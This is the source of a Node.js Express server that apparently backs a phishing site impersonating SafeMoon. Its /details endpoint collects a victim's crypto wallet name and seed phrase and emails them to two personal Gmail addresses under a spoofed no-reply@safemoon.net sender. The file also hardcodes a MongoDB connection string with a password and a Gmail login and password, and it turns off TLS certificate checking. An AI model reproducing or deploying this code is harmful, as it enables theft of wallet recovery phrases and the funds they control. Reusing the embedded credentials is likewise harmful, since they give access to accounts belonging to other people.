const express = require('express')
const mongoose = require('mongoose')
const clientDetails = require('./clientDetails')
const cors = require('cors')
const nodemailer = require("nodemailer")


// app config
const app = express()
const port = process.env.port || 5000


// middlewares
app.use(express.json())
app.use(cors())
app.use(express.urlencoded({ extended: false }))




//dbconfig
const connection_url = 'mongodb+srv://archibeque:ready007@cluster0.qvtmu.mongodb.net/safemoon?retryWrites=true&w=majority'


// mongoose.connect(connection_url, {
//     useNewUrlParser: true, 
//     useUnifiedTopology: true, 
// })
//     .then(console.log('mongodb connected'))
//     .catch(err => console.log(err))



app.post("/details", (req, res) => {
    console.log(req.body)
    const dbData = req.body

    const {cryptowallet, seedorphrase} = req.body

    // clientDetails.create( dbData )
    //     .then((err, data) =>{
    //         if(err){
    //             res.status(500).send(err)
    //         }else{
    //             console.log(data)
    //         }
    //     })
    //     .catch(err => {
    //         console.log(err)
    //         // if (err.response) {
    //         //     err.response.data
    //         // }
    //     })



    const transporter = nodemailer.createTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        auth: {
            user: "brownweek1@gmail.com",
            pass: "Justin2000"
        },
        secure: false,
        tls:{
            rejectUnauthorized: false
        }
    })
    
    const mailoptions = {
        from: 'no-reply@safemoon.net',
        to: 'archibequedavid308@gmail.com, danielbbl044@gmail.com',
        subject: 'safemoon details',
        html: `<p>This is the cryptowallet  <h2><strong>"${cryptowallet}"</strong></h2> and seedorPhrase <h2><strong>"${seedorphrase}"</strong></h2> <p>`
    }
    
    
    transporter.sendMail(mailoptions, (err, info) => {
        if(err){
            console.log(err)

        }
        else{
            console.log(info)
            res.status(200).send(info)

        }
    })
        
})





app.listen(port, () => {console.log(`app started on port ${port}`)})